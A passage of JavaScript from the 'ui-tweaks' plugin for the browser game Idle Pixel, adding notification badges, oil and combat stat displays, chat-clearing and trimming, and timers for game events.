                if (merchantTiming > 0 || merchantUnlocked == 0) {
                    merchantAvail.style.display = ""none"";
                } else {
                    merchantAvail.style.display = ""inline-block"";
                }
            }

            const robotAvail = document.querySelector(""#notification-robot_avail"");
            if (robotAvail) {
                if (robotTiming > 0 || robotUnlocked == 0) {
                    robotAvail.style.display = ""none"";
                } else {
                    robotAvail.style.display = ""inline-block"";
                }
            }

            getThis.miningMachTimer();
            // fix chat
            purpleKeyGo = getThis.getConfig(""showPurpleKeyNotification"");

            getThis.onConfigsChanged();

            //Left menu energy info
            const menuBarEnergy = document.getElementById(""menu-bar-energy"");
            const menuBarFightPoints = document.createElement(""span"");
            menuBarFightPoints.id = ""menu-bar-fight-points"";
            menuBarFightPoints.innerHTML = `
              (<span class=""fight-points-full-timmer"" id=""fight-points-full-id-menu""></span>)
            `;

            const menuBarFightPoints_2 = document.createElement(""span"");
            menuBarFightPoints_2.id = ""menu-bar-fight-points"";
            menuBarFightPoints_2.innerHTML = `
              (<span class=""fight-points-full-timmer"" id=""fight-points-full-id-menu_2""></span>)
            `;

            document
                .getElementById(""menu-bar-fp"")
                .insertAdjacentElement(""beforeend"", menuBarFightPoints);
            document
                .getElementById(""menu-bar-fp-2"")
                .insertAdjacentElement(""beforeend"", menuBarFightPoints_2);

            const menuBarCrystals = document.getElementById(""menu-bar-crystals"");

            // SD Watch Left Side

            const sdWatchElement = document.createElement(""span"");
            sdWatchElement.innerHTML = `<br>
  <span onClick=""websocket.send(Modals.clicks_stardust_watch())"" id=""menu-bar-sd_watch"">
    <img id=""sd-watch-img"" class=""img-20"" src=""${UIT_IMAGE_URL_BASE}stardust_watch.png"">
    <span class=""sd-watch-text"">Watch Charges</span>
    (<span class=""sd-watch-charges"">0</span>)
  </span>
`;
            const sdWatchElement2 = document.createElement(""td"");
            sdWatchElement2.innerHTML = `
            <div class=""top-bar-2-item"">
  <span onClick=""websocket.send(Modals.clicks_stardust_watch())"" id=""menu-bar-sd_watch_2"">
    <img id=""sd-watch-img"" class=""img-20"" src=""${UIT_IMAGE_URL_BASE}stardust_watch.png"">
    <span class=""sd-watch-text"">Watch Charges</span>
    (<span class=""sd-watch-charges_2"">0</span>)
  </span>
  </div>
`;

            document
                .getElementById(""menu-bar-crystals"")
                .insertAdjacentElement(""beforebegin"", sdWatchElement);
            document
                .getElementById(""menu-bar-crystals-2"")
                .parentNode.insertAdjacentElement(""beforebegin"", sdWatchElement2);

            const energyItemDisplay = document.querySelector(
                '#menu-bar-hero item-display[data-key=""energy""]'
            );

            const menuBarFightPointsCombat = document.createElement(""span"");
            menuBarFightPointsCombat.id = ""menu-bar-fight-fight-points"";
            menuBarFightPointsCombat.innerHTML = `<img id=""menu-bar-fight-points-img"" class=""img-20"" src=""${UIT_IMAGE_URL_BASE}fight_points.png""><item-display data-format=""number"" data-key=""fight_points""> 0</item-display>(<span class=""fight-points-full-timmer"" id=""fight-points-full-id-combat""></span>)`;

            energyItemDisplay.parentElement.insertBefore(
                menuBarFightPointsCombat,
                energyItemDisplay.nextSibling
            );

            uitLevel().initNextLevel();

            // machine arrows
            const machineryList = [
                ""drill"",
                ""crusher"",
                ""giant_drill"",
                ""excavator"",
                ""giant_excavator"",
                ""massive_excavator"",
            ];

            machineryList.forEach((machine) => {
                const itemBox = document.querySelector(`itembox[data-item=${machine}]`);
                if (itemBox) {
                    const arrowControlsDiv = document.createElement(""div"");
                    arrowControlsDiv.className = ""arrow-controls"";
                    arrowControlsDiv.onclick = function (event) {
                        event.stopPropagation();
                    };

                    const arrowUpDiv = document.createElement(""div"");
                    arrowUpDiv.className = ""arrow up"";
                    arrowUpDiv.onclick = function (event) {
                        event.stopPropagation();
                        IdlePixelPlus.sendMessage(`MACHINERY=${machine}~increase`);
                    };

                    const itemDisplay = document.createElement(""item-display"");
                    itemDisplay.setAttribute(""data-format"", ""number"");
                    itemDisplay.setAttribute(""data-key"", `${machine}_on`);
                    itemDisplay.innerHTML = ""1"";

                    const arrowDownDiv = document.createElement(""div"");
                    arrowDownDiv.className = ""arrow down"";
                    arrowDownDiv.onclick = function (event) {
                        event.stopPropagation();
                        IdlePixelPlus.sendMessage(`MACHINERY=${machine}~decrease`);
                    };

                    arrowControlsDiv.appendChild(arrowUpDiv);
                    arrowControlsDiv.appendChild(itemDisplay);
                    arrowControlsDiv.appendChild(arrowDownDiv);

                    itemBox.appendChild(arrowControlsDiv);
                }
            });

            // custom notifications
            const notificationsArea = document.getElementById(""notifications-area"");

            if (notificationsArea) {
                const notificationOilFull = document.createElement(""div"");
                notificationOilFull.id = ""ui-tweaks-notification-oil-full"";
                notificationOilFull.style.display = ""none"";
                notificationOilFull.classList.add(""notification"", ""hover"");
                notificationOilFull.onclick = function () {
                    switch_panels(""panel-mining"");
                };

                notificationOilFull.innerHTML = `
        <img src=""${UIT_IMAGE_URL_BASE}oil.png"" class=""w20"">
        <span class=""font-small color-yellow"">Oil Full</span>
    `;

                notificationsArea.appendChild(notificationOilFull);
            }

            const panelMining = document.querySelector(""#panel-mining .progress-bar"");
            const panelCrafting = document.querySelector(
                ""#panel-crafting .progress-bar""
            );

            if (panelMining) {
                const oilSummaryMining = document.createElement(""div"");
                oilSummaryMining.id = ""oil-summary-mining"";
                oilSummaryMining.style.marginTop = ""0.5em"";

                const oilLabel = document.createElement(""strong"");
                oilLabel.textContent = ""Oil: "";

                const oilDisplay = document.createElement(""item-display"");
                oilDisplay.setAttribute(""data-format"", ""number"");
                oilDisplay.setAttribute(""data-key"", ""oil"");

                const maxOilDisplay = document.createElement(""item-display"");
                maxOilDisplay.setAttribute(""data-format"", ""number"");
                maxOilDisplay.setAttribute(""data-key"", ""max_oil"");

                const inLabel = document.createElement(""strong"");
                inLabel.textContent = ""In: "";

                const inDisplay = document.createElement(""item-display"");
                inDisplay.setAttribute(""data-format"", ""number"");
                inDisplay.setAttribute(""data-key"", ""oil_in"");

                const outLabel = document.createElement(""strong"");
                outLabel.textContent = ""Out: "";

                const outDisplay = document.createElement(""item-display"");
                outDisplay.setAttribute(""data-format"", ""number"");
                outDisplay.setAttribute(""data-key"", ""oil_out"");

                const deltaLabel = document.createElement(""strong"");
                deltaLabel.textContent = ""Delta: "";

                const deltaDisplay = document.createElement(""item-display"");
                deltaDisplay.setAttribute(""data-format"", ""number"");
                deltaDisplay.setAttribute(""data-key"", ""oil_delta"");

                oilSummaryMining.appendChild(oilLabel);
                oilSummaryMining.appendChild(oilDisplay);
                oilSummaryMining.appendChild(document.createTextNode("" / ""));
                oilSummaryMining.appendChild(maxOilDisplay);
                oilSummaryMining.appendChild(document.createElement(""br""));
                oilSummaryMining.appendChild(inLabel);
                oilSummaryMining.appendChild(document.createTextNode(""+""));
                oilSummaryMining.appendChild(inDisplay);
                oilSummaryMining.appendChild(
                    document.createTextNode(""\u00A0\u00A0\u00A0"")
                );
                oilSummaryMining.appendChild(outLabel);
                oilSummaryMining.appendChild(document.createTextNode(""-""));
                oilSummaryMining.appendChild(outDisplay);
                oilSummaryMining.appendChild(document.createElement(""br""));
                oilSummaryMining.appendChild(deltaLabel);
                oilSummaryMining.appendChild(deltaDisplay);

                panelMining.parentNode.insertBefore(
                    oilSummaryMining,
                    panelMining.nextSibling
                );
            }

            if (panelCrafting) {
                const oilSummaryCrafting = document.createElement(""div"");
                oilSummaryCrafting.id = ""oil-summary-crafting"";
                oilSummaryCrafting.style.marginTop = ""0.5em"";

                const oilLabel = document.createElement(""strong"");
                oilLabel.textContent = ""Oil: "";

                const oilDisplay = document.createElement(""item-display"");
                oilDisplay.setAttribute(""data-format"", ""number"");
                oilDisplay.setAttribute(""data-key"", ""oil"");

                const maxOilDisplay = document.createElement(""item-display"");
                maxOilDisplay.setAttribute(""data-format"", ""number"");
                maxOilDisplay.setAttribute(""data-key"", ""max_oil"");

                const inLabel = document.createElement(""strong"");
                inLabel.textContent = ""In: "";

                const inDisplay = document.createElement(""item-display"");
                inDisplay.setAttribute(""data-format"", ""number"");
                inDisplay.setAttribute(""data-key"", ""oil_in"");

                const outLabel = document.createElement(""strong"");
                outLabel.textContent = ""Out: "";

                const outDisplay = document.createElement(""item-display"");
                outDisplay.setAttribute(""data-format"", ""number"");
                outDisplay.setAttribute(""data-key"", ""oil_out"");

                const deltaLabel = document.createElement(""strong"");
                deltaLabel.textContent = ""Delta: "";

                const deltaDisplay = document.createElement(""item-display"");
                deltaDisplay.setAttribute(""data-format"", ""number"");
                deltaDisplay.setAttribute(""data-key"", ""oil_delta"");

                oilSummaryCrafting.appendChild(oilLabel);
                oilSummaryCrafting.appendChild(oilDisplay);
                oilSummaryCrafting.appendChild(document.createTextNode("" / ""));
                oilSummaryCrafting.appendChild(maxOilDisplay);
                oilSummaryCrafting.appendChild(document.createElement(""br""));
                oilSummaryCrafting.appendChild(inLabel);
                oilSummaryCrafting.appendChild(document.createTextNode(""+""));
                oilSummaryCrafting.appendChild(inDisplay);
                oilSummaryCrafting.appendChild(
                    document.createTextNode(""\u00A0\u00A0\u00A0"")
                );
                oilSummaryCrafting.appendChild(outLabel);
                oilSummaryCrafting.appendChild(document.createTextNode(""-""));
                oilSummaryCrafting.appendChild(outDisplay);
                oilSummaryCrafting.appendChild(document.createElement(""br""));
                oilSummaryCrafting.appendChild(deltaLabel);
                oilSummaryCrafting.appendChild(deltaDisplay);

                panelCrafting.parentNode.insertBefore(
                    oilSummaryCrafting,
                    panelCrafting.nextSibling
                );
            }

            document
                .querySelector(""#notification-furnace-label"")
                .insertAdjacentHTML(
                    ""afterend"",
                    '<span id=""notification-furnace-timer"" class=""font-small color-white""></span>'
                );
            document
                .querySelector(""#notification-rocket-label"")
                .insertAdjacentHTML(
                    ""afterend"",
                    '<span id=""notification-rocket-timer"" class=""font-small color-white""></span>'
                );
            document
                .querySelector(""#notification-mega_rocket-label"")
                .insertAdjacentHTML(
                    ""afterend"",
                    '<span id=""notification-mega_rocket-timer"" class=""font-small color-white""></span>'
                );

            // clear chat button
            var chatAutoScrollButton = document.getElementById(
                ""chat-auto-scroll-button""
            );
            var chatClearButton = document.createElement(""button"");
            chatClearButton.id = ""chat-clear-button"";
            chatClearButton.textContent = ""CLEAR"";
            chatClearButton.style.color = ""green"";
            chatClearButton.onclick = function () {
                IdlePixelPlus.plugins[""ui-tweaks""].clearChat();
            };

            chatAutoScrollButton.insertAdjacentElement(""afterend"", chatClearButton);

            // reorganize chat location
            const self = this;
            const chat = document.querySelector(""#game-chat > :first-child"");
            const chatTop = document.createElement(""div"");
            chatTop.id = ""chat-top"";
            const chatArea = document.querySelector(""#chat-area"");
            const chatBottom = document.querySelector(
                ""#game-chat > :first-child > :last-child""
            );

            while (chat.firstChild) {
                chatTop.appendChild(chat.firstChild);
            }

            chat.appendChild(chatTop);
            chat.appendChild(chatArea);
            chat.appendChild(chatBottom);

            // override for service messages
            const original_yell_to_chat_box = Chat.yell_to_chat_box;
            Chat.yell_to_chat_box = function () {
                original_yell_to_chat_box.apply(Chat, arguments);
                self.updateColors();
            };

            var currentFP = getVar(""fight_points"", 0, ""int"").toLocaleString();
            var rarePotTimer = getVar(""rare_monster_potion_timer"", 0, ""int"");
            var rarePotPlusTimer = getVar(
                ""super_rare_monster_potion_timer"",
                0,
                ""int""
            );
            var rarePotInfo = """";

            if (rarePotTimer > 0) {
                rarePotInfo = rarePotTimer;
            } else if (rarePotPlusTimer > 0) {
                rarePotInfo = rarePotPlusTimer;
            } else {
                rarePotInfo = ""Inactive"";
            }

            var combatLootPotActive = getVar(""combat_loot_potion_active"", 0, ""int"");
            var combatLootPotTimer = getVar(""combat_loot_potion_timer"", 0, ""int"");
            var combatLootPotInfo = """";

            if (combatLootPotActive == 1) {
                combatLootPotInfo = ""Active"";
            } else {
                combatLootPotInfo = ""Inactive"";
            }

            function createCombatStatEntry(id, imgSrc, imgTitle, text, value) {
                const entry = document.createElement(""div"");
                entry.className = ""td-combat-stat-entry"";
                entry.id = id;

                let content;

                if (
                    id == ""combat-info-loot_pot-right"" ||
                    id == ""combat-info-loot_pot-left""
                ) {
                    content = `
                <br>
        <img class=""img-15"" src=""${imgSrc}"" title=""${imgTitle}"">
        <span style=""color:white"">${text}:</span>
        <span id=""${id}-lp"">${value}</span>
    `;
                } else if (
                    id == ""combat-info-fight_point-right"" ||
                    id == ""combat-info-fight_point-left""
                ) {
                    content = `
        <img class=""img-15"" src=""${imgSrc}"" title=""${imgTitle}"">
        <span style=""color:white"">${text}:</span>
        <span id=""${id}-fp"">${value}</span>
    `;
                } else {
                    content = `
        <img class=""img-15"" src=""${imgSrc}"" title=""${imgTitle}"">
        <span style=""color:white"">${text}:</span>
        <span id=""${id}-rp"">${value}</span>
    `;
                }

                entry.innerHTML = content;
                return entry;
            }

            function insertAfter(newNode, referenceNode) {
                referenceNode.parentNode.insertBefore(
                    newNode,
                    referenceNode.nextSibling
                );
            }

            var lastChildInPanel = document.querySelector(
                ""#panel-combat-canvas > center > table > tbody > tr:nth-child(2) > td.fight-left-border > div.td-combat-bottom-panel.shadow > div:last-child""
            );
            insertAfter(
                createCombatStatEntry(
                    ""combat-info-fight_point-right"",
                    `${UIT_IMAGE_URL_BASE}fight_points.png`,
                    ""fight_points_white-right"",
                    ""FP"",
                    currentFP
                ),
                lastChildInPanel
            );
            insertAfter(
                createCombatStatEntry(
                    ""combat-info-rare_pot-right"",
                    `${UIT_IMAGE_URL_BASE}rare_monster_potion.png`,
                    ""rare_potion_white-right"",
                    ""Rare Pot"",
                    rarePotInfo
                ),
                lastChildInPanel
            );
            insertAfter(
                createCombatStatEntry(
                    ""combat-info-loot_pot-right"",
                    `${UIT_IMAGE_URL_BASE}combat_loot_potion.png`,
                    ""combat_loot_potion_white-right"",
                    ""Loot Pot"",
                    combatLootPotInfo
                ),
                lastChildInPanel
            );

            var idleHeroArrowsArea = document.querySelector(
                ""#menu-bar-idle-hero-arrows-area-2""
            );
            insertAfter(
                createCombatStatEntry(
                    ""combat-info-fight_point-left"",
                    `${UIT_IMAGE_URL_BASE}fight_points.png`,
                    ""fight_points_white-left"",
                    ""FP"",
                    currentFP
                ),
                idleHeroArrowsArea
            );
            insertAfter(
                createCombatStatEntry(
                    ""combat-info-rare_pot-left"",
                    `${UIT_IMAGE_URL_BASE}rare_monster_potion.png`,
                    ""rare_potion_white-left"",
                    ""Rare Pot"",
                    rarePotInfo
                ),
                idleHeroArrowsArea
            );
            insertAfter(
                createCombatStatEntry(
                    ""combat-info-loot_pot-left"",
                    `${UIT_IMAGE_URL_BASE}combat_loot_potion.png`,
                    ""combat_loot_potion_white-left"",
                    ""Loot Pot"",
                    combatLootPotInfo
                ),
                idleHeroArrowsArea
            );

            getThis.oilTimerNotification();
            setTimeout(function () {
                uitRocket().timeout();
                IdlePixelPlus.plugins[""ui-tweaks""].onConfigsChanged();
            }, 20);

            var existingElement = document.getElementById(
                ""menu-bar-idlepixelplus-icon""
            ).parentNode;

            var newContainer = document.createElement(""div"");
            newContainer.setAttribute(
                ""onclick"",
                ""IdlePixelPlus.setPanel('idlepixelplus')""
            );
            newContainer.className = ""hover hover-menu-bar-item left-menu-item"";

            // Create the inner table structure
            var table = document.createElement(""table"");
            table.className = ""game-menu-bar-left-table-btn left-menu-item-other"";
            table.style.width = ""100%"";

            var tbody = document.createElement(""tbody"");
            var tr = document.createElement(""tr"");
            var td1 = document.createElement(""td"");
            td1.style.width = ""30px"";

            // Assuming there's only one image in the existing element
            var img = existingElement.querySelector(""img"");
            img.className = ""w30"";
            td1.appendChild(img);

            var td2 = document.createElement(""td"");
            // The text node for 'PLUGINS'
            var textNode = document.createTextNode(""PLUGINS"");
            td2.appendChild(textNode);

            // Append everything together
            tr.appendChild(td1);
            tr.appendChild(td2);
            tbody.appendChild(tr);
            table.appendChild(tbody);
            newContainer.appendChild(table);

            existingElement.parentNode.replaceChild(newContainer, existingElement);

            if (getThis.getConfig(""condensedUI"")) {
                getThis.condensedUI();
            } else {
                getThis.defaultUI();
            }

            uitCriptoe().addCriptoeValues();

            // Add event listener to the element
            document.getElementById('raids-team-panel-uuid').addEventListener('click', function (event) {
                // This will copy the text content of the element to the clipboard
                IdlePixelPlus.plugins['ui-tweaks'].copyTextToClipboard(event.target.innerText);
            });

            document.getElementById(""raids-team-panel-uuid"").addEventListener(""click"", function (event) {
                // Copy text to clipboard
                navigator.clipboard.writeText(this.innerText).then(() => {
                    // Check if the message element already exists, create if not
                    let message = document.getElementById(""copy-message"");
                    if (!message) {
                        message = document.createElement(""div"");
                        message.id = ""copy-message"";
                        message.style.position = ""absolute"";
                        message.style.backgroundColor = ""black"";
                        message.style.color = ""white"";
                        message.style.padding = ""5px"";
                        message.style.borderRadius = ""5px"";
                        message.style.zIndex = ""1000""; // Ensure it appears above other content
                        message.style.fontSize = ""20px"";
                        message.innerText = ""Password Copied"";
                        document.getElementById(""panel-combat"").appendChild(message);
                    }

                    // Show the ""Password Copied"" message
                    message.style.display = ""block"";
                    message.style.left = `${event.clientX}px`;
                    message.style.top = `${event.clientY}px`; // 20 pixels below the cursor for visibility

                    // Hide the message after 2 seconds
                    setTimeout(() => {
                        message.style.display = ""none"";
                    }, 2000);
                }).catch(err => {
                    console.error('Failed to copy text: ', err);
                });
            });
            IdlePixelPlus.plugins['ui-tweaks'].addChatDisplayWatcher();
            uitTableLabels().disableTableRefreshBrewing();
            uitTableLabels().Crafting_getMaterials();
            uitTableLabels().Invention_getMaterials();
            uitHoliday().easter2024();
            uitDustPotions().cloneDust();

            onLoginLoaded = true;
        }
        //////////////////////////////// onLogin End ////////////////////////////////

        clearChat() {
            const chatArea = document.getElementById(""chat-area"");
            while (chatArea.firstChild) {
                chatArea.removeChild(chatArea.firstChild);
            }
        }

        limitChat() {
            const chatArea = document.getElementById(""chat-area"");
            const chatLength = chatArea.innerHTML.length;
            const limit = getThis.getConfig(""chatLimit"");

            if (limit > 0 || chatLength > 190000) {
                const children = chatArea.children;

                if (limit > 0) {
                    if (children.length > limit) {
                        const toDelete = children.length - limit;

                        for (let i = 0; i < toDelete; i++) {
                            try {
                                chatArea.removeChild(children[i]);
                            } catch (err) {
                                console.error(""Error cleaning up chat"", err);
                            }
                        }

                        if (Chat._auto_scroll) {
                            chatArea.scrollTop = chatArea.scrollHeight;
                        }
                    }
                }

                if (chatLength > 190000) {
                    for (let i = 0; i < 3; i++) {
                        try {
                            chatArea.removeChild(children[i]);
                        } catch (err) {
                            console.error(""Error cleaning up chat"", err);
                        }
                    }
                }
            }
        }

        onPanelChanged(panelBefore, panelAfter) {
            if (onLoginLoaded) {
                if (panelAfter = ""brewing"") {
                    uitTableLabels().updateTableCraftLabels();
                }
                uitInvention().hideOrbsAndRing();

                if (panelBefore !== panelAfter && panelAfter === ""idlepixelplus"") {
                    const options = document.querySelectorAll(
                        ""#idlepixelplus-config-ui-tweaks-font option""
                    );
                    if (options) {
                        options.forEach(function (el) {
                            const value = el.getAttribute(""value"");
                            if (value === ""IdlePixel Default"") {
                                el.style.fontFamily = FONT_FAMILY_DEFAULT;
                            } else {
                                el.style.fontFamily = value;
                            }
                        });
                    }
                }

                if (
                    [""farming"", ""woodcutting"", ""combat""].includes(panelAfter) &&
                    getThis.getConfig(""imageTitles"")
                ) {
                    const images = document.querySelectorAll(`#panel-${panelAfter} img`);
                    if (images) {
                        images.forEach(function (el) {
                            let src = el.getAttribute(""src"");
                            if (src && src !== ""x"") {
                                src = src.replace(/.*\//, """").replace(/\.\w+$/, """");
                                el.setAttribute(""title"", src);
                            }
                        });
                    }
                }

                if (Globals.currentPanel === ""panel-fishing"") {
                    uitFishing().calcFishEnergy();
                }

                if (Globals.currentPanel === ""panel-criptoe-market"") {
                    uitCriptoe().addCriptoeValues();
                }
            }
        }


        //////////////////////////////// onVariableSet Start ////////////////////////////////
        onVariableSet(key, valueBefore, valueAfter) {
            if (onLoginLoaded) {
                //console.log(new Date() + "" "" + document.readyState);
                if (Globals.currentPanel != ""panel-combat-canvas"" && Globals.currentPanel != ""panel-combat-canvas-raids"") {
                    if (key.endsWith(""_on"")) {
                        setTimeout(function () {
                            IdlePixelPlus.plugins[""ui-tweaks""].miningMachTimer();
                        }, 100);
                    }

                    /*if (Globals.currentPanel == ""panel-brewing"") {
                        uitTableLabels().updateTableCraftLabels();
                    }*/

                    if (key == ""oil"") {
                        getThis.oilGain();
                    }

                    if (key == ""criptoe"" && valueBefore != valueAfter) {
                        uitCriptoe().addCriptoeValues();
                    }

                    if (key.endsWith(""_xp"")) {
                        const varName = `var_ipp_${key}_next`;
                        const xp = parseInt(valueAfter || ""0"");
                        const level = uitLevel().xpToLevel(xp);
                        const xpAtNext = uitLevel().LEVELS()[level + 1];
                        const next = xpAtNext - xp;
                        window[varName] = `${next}`;
                    }

                    if ([""oil"", ""max_oil""].includes(key)) {
                        const oil = IdlePixelPlus.getVar(""oil"");
                        const maxOil = IdlePixelPlus.getVar(""max_oil"");
                        if (
                            oil &&
                            oil == maxOil &&
                            getThis.getConfig(""oilFullNotification"")
                        ) {
                            document.querySelector(
                                ""#ui-tweaks-notification-oil-full""
                            ).style.display = """";
                        } else {
                            document.querySelector(
                                ""#ui-tweaks-notification-oil-full""
                            ).style.display = ""none"";
                        }
                    }

                    if ([""oil_in"", ""oil_out""].includes(key)) {
                        const oilIn = getVar(""oil_in"", 0, ""int"");
                        const oilOut = getVar(""oil_out"", 0, ""int"");
                        window.var_oil_delta = `${oilIn - oilOut}`;
                    }

                    getThis.fightPointsFull();

                    if ([""rocket_km"", ""rocket_status"", ""rocket_potion_timer"", ""rocket_fuel"", ""rocket_potion""].includes(key)) {
                        uitRocket().varChange();
                    }

                    uitRocket().onVar();

                    if (key == ""moon_distance"" || key == ""sun_distance"") {
                        uitRocket().rocketInfoUpdate(key);
                    }
                    uitRocket().rocketStatus();

                    if (
                        [
                            ""furnace_ore_type"",
                            ""furnace_countdown"",
                            ""furnace_ore_amount_at"",
                        ].includes(key)
                    ) {
                        const el = document.querySelector(""#notification-furnace-timer"");
                        const ore = getVar(""furnace_ore_type"", ""none"");
                        if (ore == ""none"") {
                            el.textContent = """";
                            return;
                        }
                        const timerRemaining = getVar(""furnace_countdown"", 0, ""int"");
                        const timePerOre = SMELT_TIMES[ore] - 1;
                        const startAmount = getVar(""furnace_ore_amount_set"", 0, ""int"");
                        const doneAmount = getVar(""furnace_ore_amount_at"", 0, ""int"");
                        const remaining = startAmount - doneAmount - 1;
                        const totalTime = remaining * timePerOre + timerRemaining;
                        el.textContent = "" - "" + format_time(totalTime);
                    }

                    if (key == ""combat_loot_potion_active"") {
                        const loot_pot = getVar(""combat_loot_potion_active"", 0, ""int"");
                        if (loot_pot == 0) {
                            hideElement(
                                document.getElementById(""notification-loot_pot_avail"")
                            );
                        } else {
                            showInlineBlockElement(
                                document.getElementById(""notification-loot_pot_avail"")
                            );
                        }
                    }

                    ////////// SD Watch Notification
                    const sdWatchCrafted = getVar(""stardust_watch_crafted"", 0, ""int"");
                    const sdWatchCharges = getVar(""stardust_watch_charges"", 0, ""int"");
                    if (getThis.getConfig(""moveSDWatch"") && sdWatchCrafted === 1) {
                        hideElement(document.getElementById(""notification-stardust_watch""));
                        document.querySelector(
                            ""#menu-bar-sd_watch .sd-watch-charges""
                        ).textContent = sdWatchCharges;
                        document.querySelector(
                            ""#menu-bar-sd_watch_2 .sd-watch-charges_2""
                        ).textContent = sdWatchCharges;
                    } else if (!getThis.getConfig(""moveSDWatch"") && sdWatchCharges > 0) {
                        showElement(document.getElementById(""notification-stardust_watch""));
                    } else {
                        hideElement(document.getElementById(""notification-stardust_watch""));
                        hideElement(document.getElementById(""menu-bar-sd_watch""));
                    }

                    if (key.startsWith(""gathering_working_gathering_loot_bag_"")) {
                        var today = new Date();
                        var time =
                            today.getHours().toLocaleString(""en-US"", {
                                minimumIntegerDigits: 2,
                                useGrouping: false,
                            }) +
                            "":"" +
                            today.getMinutes().toLocaleString(""en-US"", {
                                minimumIntegerDigits: 2,
                                useGrouping: false,
                            }) +
                            "":"" +
                            today.getSeconds().toLocaleString(""en-US"", {
                                minimumIntegerDigits: 2,
                                useGrouping: false,
                            });
                        var location = key.replace(
                            ""gathering_working_gathering_loot_bag_"",
                            """"
                        );
                        var bagCount = getVar(key, 0, ""int"").toLocaleString();
                    }

                    if (key.includes(""raw_"") || key.includes(""cooked_"")) {
                        if (Globals.currentPanel == ""panel-fishing"") {
                            uitFishing().calcFishEnergy();
                        }
                    }

                    if (key.endsWith(""_xp"")) {
                        uitLevel().extendedLevelsUpdate();
                    }

                    const hideBoatNotifications = getThis.getConfig(""hideBoat"");
                    const pirate_ship_timer = getVar(""pirate_ship_timer"", 0, ""int"");
                    const row_boat_timer = getVar(""row_boat_timer"", 0, ""int"");
                    const canoe_boat_timer = getVar(""canoe_boat_timer"", 0, ""int"");
                    const stardust_boat_timer = getVar(""stardust_boat_timer"", 0, ""int"");
                    const submarine_boat_timer = getVar(""submarine_boat_timer"", 0, ""int"");
                    if (hideBoatNotifications) {
                        hideElement(document.getElementById(""notification-row_boat""));
                        hideElement(document.getElementById(""notification-canoe_boat""));
                        hideElement(document.getElementById(""notification-stardust_boat""));
                        hideElement(document.getElementById(""notification-pirate_ship""));
                        hideElement(document.getElementById(""notification-submarine_boat""));
                    } else {
                        if (row_boat_timer > 0) {
                            showElement(document.getElementById(""notification-row_boat""));
                        }
                        if (canoe_boat_timer > 0) {
                            showElement(document.getElementById(""notification-canoe_boat""));
                        }
                        if (stardust_boat_timer > 0) {
                            showElement(
                                document.getElementById(""notification-stardust_boat"")
                            );
                        }
                        if (pirate_ship_timer > 0) {
                            showElement(document.getElementById(""notification-pirate_ship""));
                        }
                        if (submarine_boat_timer > 0) {
                            showElement(
                                document.getElementById(""notification-submarine_boat"")
                            );
                        }
                    }

                    if (key === ""furnace_ore_amount_set"") {
                        setTimeout(function () {
                            var furnaceOreTypeVar = getVar(
                                ""furnace_ore_amount_set"",
                                0,
                                ""int""
                            );
                            var furnaceNotifVar = IdlePixelPlus.plugins[
                                ""ui-tweaks""
                            ].getConfig(""furnaceEmptyNotification"");

                            if (furnaceOreTypeVar <= 0 && furnaceNotifVar) {
                                document.getElementById(
                                    ""notification-furnace_avail""
                                ).style.display = ""inline-block"";
                            } else {
                                hideElement(
                                    document.getElementById(""notification-furnace_avail"")
                                );
                            }
                        }, 500);
                    }

                    if (key.startsWith(""nades_purple_key"")) {
                        let purpKeyMonst = getVar(""nades_purple_key_monster"", """", ""string"");
                        let purpKeyRarity = getVar(""nades_purple_key_rarity"", """", ""string"");
                        let purpKeyTimer = getVar(""nades_purple_key_timer"", 0, ""int"");

                        uitPurpleKey().onPurpleKey(
                            purpKeyMonst,
                            purpKeyRarity,
                            purpKeyTimer
                        );
                    }

                }
                ////////// Allowed to Run while in combat
                ////////// Current FP with Timer (Left Sidecar)
                if (Globals.currentPanel == ""panel-combat-canvas"") {
                    var currentFP = getVar(""fight_points"", 0, ""int"").toLocaleString();
                    var rarePotTimer = getVar(""rare_monster_potion_timer"", 0, ""int"");
                    var rarePotPlusTimer = getVar(
                        ""super_rare_monster_potion_timer"",
                        0,
                        ""int""
                    );
                    var rarePotInfo = """";

                    if (rarePotTimer > 0) {
                        rarePotInfo = rarePotTimer;
                    } else if (rarePotPlusTimer > 0) {
                        rarePotInfo = format_time(rarePotPlusTimer);
                    } else {
                        rarePotInfo = ""Inactive"";
                    }

                    var combatLootPotActive = getVar(
                        ""combat_loot_potion_active"",
                        0,
                        ""int""
                    );
                    var combatLootPotInfo = combatLootPotActive ? ""Active"" : ""Inactive"";

                    document.getElementById(
                        ""combat-info-fight_point-right-fp""
                    ).textContent = "" "" + currentFP;
                    document.getElementById(
                        ""combat-info-fight_point-left-fp""
                    ).textContent = "" "" + currentFP;
                    document.getElementById(""combat-info-rare_pot-right-rp"").textContent =
                        "" "" + rarePotInfo;
                    document.getElementById(""combat-info-rare_pot-left-rp"").textContent =
                        "" "" + rarePotInfo;
                    document.getElementById(""combat-info-loot_pot-right-lp"").textContent =
                        "" "" + combatLootPotInfo;
                    document.getElementById(""combat-info-loot_pot-left-lp"").textContent =
                        "" "" + combatLootPotInfo;
                }

                function setTransform(element, transformValue) {
                    element.style.transform = transformValue;
                }

                function clearTransform(element) {
                    element.style.transform = """";
                }

                function showInlineBlockElement(element) {
                    element.style.display = ""inline-block"";
                }

                function showBlockElement(element) {
                    element.style.display = ""block"";
                }

                function showElement(element) {
                    element.style.display = """";
                }

                function showFlexElement(element) {
                    element.style.display = ""block"";
                }

                function hideElement(element) {
                    element.style.display = ""none"";
                }

                if (key == ""playtime"") {
                    utcDate = new Date().getUTCDate();
                    if (utcDate != currUTCDate) {
                        currUTCDate = utcDate;
                        //console.log(`UTCDate is now: ${currUTCDate}, and the criptoe update has fired off.`);
                        uitCriptoe().addCriptoeValues();
                    }
                }
                if (key == ""in_raids"" && valueAfter == 1) {
                    document.getElementById('raids-advert-button').style.display = 'none';
                    document.getElementById('raids-start-button').style.display = 'none';
                }
            }
        }
        //////////////////////////////// onVariableSet end ////////////////////////////////

        onChat(data) {
            getThis.updateColors(CHAT_UPDATE_FILTER);
            getThis.limitChat();
            IdlePixelPlus.plugins['ui-tweaks'].makeUUIDClickable();
        }

        onCombatEnd() {
            getThis.updateColors(PANEL_UPDATE_FILTER);
            getThis.updateColors();
        }

        makeUUIDClickable() {
            const regex = /\b[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\b/gi;
            let chatArea = document.getElementById(""chat-area"");
            let lastMessageElement = chatArea.lastChild;
            let player = lastMessageElement.querySelector('.chat-username').innerText;
            let bgColor = `background-color: ${IdlePixelPlus.plugins['ui-tweaks'].getConfig('background-color-chat-area-raid-password')}; `;
